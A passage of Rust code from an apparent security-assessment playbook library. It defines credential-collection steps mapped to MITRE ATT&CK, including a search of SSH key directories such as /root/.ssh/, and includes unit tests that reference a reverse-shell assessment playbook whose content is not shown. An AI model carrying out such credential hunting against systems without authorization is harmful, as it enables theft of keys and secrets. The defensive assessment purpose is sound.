            PlaybookStep::new(3, PlaybookPhase::Collection, "Browser Credential Check")
                .with_description("Check for stored browser credentials")
                .with_manual("Check browser credential stores")
                .with_success("Browser credentials identified")
                .with_mitre("T1555.003", None), // Credentials from Web Browsers
        )
        .add_step(
            PlaybookStep::new(4, PlaybookPhase::Collection, "SSH Key Discovery")
                .with_description("Search for SSH private keys")
                .with_manual("Search: ~/.ssh/, /home/*/.ssh/, /root/.ssh/")
                .with_success("SSH keys located")
                .with_mitre("T1552.004", None), // Private Keys
        )
        .add_evidence(
            ExpectedEvidence::new("Plaintext credentials")
                .at("Configuration files")
                .with_indicator("API keys, passwords, tokens in plaintext")
                .severity(FindingSeverity::Critical),
        )
        .add_failed_control(
            FailedControl::new("Secret Management", "Credentials stored in plaintext files")
                .with_fix("Use secrets manager (Vault, AWS Secrets Manager)"),
        )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_all_playbooks_have_metadata() {
        for playbook in all_playbooks() {
            assert!(!playbook.metadata.id.is_empty(), "Playbook missing ID");
            assert!(
                !playbook.metadata.name.is_empty(),
                "Playbook {} missing name",
                playbook.metadata.id
            );
            assert!(
                !playbook.metadata.description.is_empty(),
                "Playbook {} missing description",
                playbook.metadata.id
            );
            assert!(
                !playbook.steps.is_empty(),
                "Playbook {} has no steps",
                playbook.metadata.id
            );
        }
    }

    #[test]
    fn test_get_playbook_by_id() {
        let playbook = get_playbook("reverse-shell-linux");
        assert!(playbook.is_some());
        assert_eq!(
            playbook.unwrap().metadata.name,
            "Reverse Shell Assessment (Linux)"
        );
    }

    #[test]
    fn test_playbooks_by_target() {
        let web_playbooks = playbooks_for_target(TargetType::WebApp);
        assert!(web_playbooks.len() >= 2);
        for p in &web_playbooks {
            assert!(p.metadata.target_types.contains(&TargetType::WebApp));
        }
    }

    #[test]
    fn test_playbooks_by_risk() {
        let safe_playbooks = playbooks_by_risk(RiskLevel::Low);
        for p in &safe_playbooks {
            assert!(p.metadata.risk_level <= RiskLevel::Low);
        }
    }

    #[test]
    fn test_reverse_shell_linux_has_all_sections() {
        let playbook = reverse_shell_linux();

        // Has metadata
        assert!(!playbook.metadata.id.is_empty());
        assert!(!playbook.metadata.objective.is_empty());

        // Has preconditions
        assert!(!playbook.preconditions.is_empty());

        // Has steps
        assert!(!playbook.steps.is_empty());
        assert!(playbook.steps.len() >= 5);

        // Has evidence
        assert!(!playbook.evidence.is_empty());

        // Has failed controls
        assert!(!playbook.failed_controls.is_empty());

        // Has variations
        assert!(!playbook.variations.is_empty());

        // Has kill chain
        assert!(!playbook.kill_chain.is_empty());

        // Internal MITRE mappings (not exposed but present)
        assert!(!playbook.metadata.mitre_techniques.is_empty());
    }
}
